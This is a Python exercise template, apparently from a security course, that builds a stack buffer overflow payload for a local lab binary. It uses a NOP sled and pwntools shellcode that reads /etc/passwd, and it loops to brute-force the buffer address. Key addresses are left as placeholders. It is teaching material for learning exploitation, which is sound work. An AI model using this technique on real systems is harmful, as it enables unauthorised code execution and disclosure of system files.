#!/usr/bin/env python3 

from pwn import *

# Exercise 2. For this exercise, we will attempt the buffer overflow attack outside gdb.
# You will notice that the payload you created in Exercise 1 will not work when
# used outside gdb, as the address of the buffer is shifted slightly. 
# Generally, the address of the stack can be affected by the size of the 
# arguments and the space allocated for environment variables passed to the
# program (as these will occupy space in the stack frame of the main function,
# thereby shifting the addresses of subsequent stack frames of the functions
# it calls). For this task, we will attempt to brute force the start address of
# the buffer. You will still need to find the buffer address using gdb,
# and then vary that address by a range of offsets. 
# For this task, we will use a slightly different payload, that simply displays the content
# of the /etc/passwd file. 


# The shellcraft library from pwntools contains many functions that
# can construct assembly instructions that are free of nulls and newline
# characters. This will be useful to craft custom code (that is not /bin/sh). 
# For example, we use the execve system call to read the /etc/passwd file using /bin/cat. 
# See: http://docs.pwntools.com/en/latest/shellcraft/amd64.html
def shellcode():
  # x86-64 architecture
  context.arch = 'amd64'
  sc = shellcraft.execve("/bin/cat", argv=["/bin/cat", "/etc/passwd"], envp=[])
  return asm(sc)


def create_payload(buffer_address): 
  # payload length
  bytearraylen = 512

  # This is where the actual payload will be stored
  # Initiallly, fill it with NOPs, to form a NOP sled. 
  content = bytearray(0x90 for i in range(bytearraylen))

  # generate shellcode 
  code = shellcode()
  
  # we'll put the shellcode at the end of the payload
  # so the shellcode's offset, relative to the start of the buffer, 
  # is bytearraylen - length_of_shellcode. 
  shellcode_offset = bytearraylen - len(code)
  content[shellcode_offset:] = code 

  # TODO: calculate the address of the shellcode
  shellcode_address = XXXX 

  # TODO: calculate offset of the stored return address
  # relative to the start of buffer. This you can find either
  # using gdb, or by examining the disassembly of the vulnerable code.  
  # You can re-use the value from Task 1, as the relative offset of the stored return
  # address does not change across different runs of the program. 
  rt_offset = XXXX

  # overwrite the stored return address with the shellcode address
  content[rt_offset:rt_offset+0x8] = p64(shellcode_address) 
  
  return content

def main():
  # TODO: guess the address of buffer
  guess = XXXX

  path_to_bin = './hexit'
  for i in range(-20,20):
    buf_addr = guess + i*8 
    print("Trying buffer address: " + hex(buf_addr))
    content = create_payload(buf_addr)    
    with open('badfile2', 'wb') as f:
      f.write(content)
    
    # run the program and check the exit code. 
    # if there are no errors, the exit code should be 0. 
    result = os.system(path_to_bin + ' 512 badfile2')
    if result == 0:
      break 
    

if __name__ == '__main__':
    main()
